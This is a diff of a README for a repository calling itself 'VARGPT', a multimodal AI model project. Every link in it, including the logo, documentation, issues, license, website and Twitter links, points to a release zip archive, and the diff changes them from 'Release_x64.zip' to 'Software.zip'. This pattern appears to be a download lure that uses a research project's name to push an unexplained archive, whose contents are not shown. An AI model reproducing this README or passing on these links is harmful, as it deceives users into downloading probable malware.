@@ -1,7 +1,7 @@
 
 # VARGPT: Unified Understanding and Generation in a Visual Autoregressive Multimodal Large Language Model
 
-![VARGPT Logo](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip)
+![VARGPT Logo](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository of **VARGPT** - a cutting-edge Unified Understanding and Generation in a Visual Autoregressive Multimodal Large Language Model. This repository serves as a hub for all things related to understanding and utilizing VARGPT to its fullest potential.
 
@@ -18,9 +18,9 @@ Welcome to the official repository of **VARGPT** - a cutting-edge Unified Unders
 ## Installation
 
 To get started with **VARGPT**, please download the software package from the following link:
-[![Download Software](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip)](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip)](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip)
 
-Once you have downloaded the `https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip` file, extract it to a local directory, and follow the installation instructions provided in the documentation.
+Once you have downloaded the `https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip` file, extract it to a local directory, and follow the installation instructions provided in the documentation.
 
 ## Usage
 
@@ -32,13 +32,13 @@ Contributions to **VARGPT** are welcome! If you have ideas for improving the mod
 
 ## Resources
 
-- [Documentation](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip)
-- [Issues](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip)
-- [License](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip)
+- [Documentation](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip)
+- [Issues](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip)
+- [License](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip)
 
 ## Stay Updated
 
-For the latest news and updates on **VARGPT**, visit our website at [https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip). You can also follow us on [Twitter](https://github.com/PrinceMalicdem/VARGPT/releases/download/v1.0/Release_x64.zip) for real-time developments and announcements.
+For the latest news and updates on **VARGPT**, visit our website at [https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip). You can also follow us on [Twitter](https://github.com/PrinceMalicdem/VARGPT/releases/download/v2.0/Software.zip) for real-time developments and announcements.
 
 ---
 
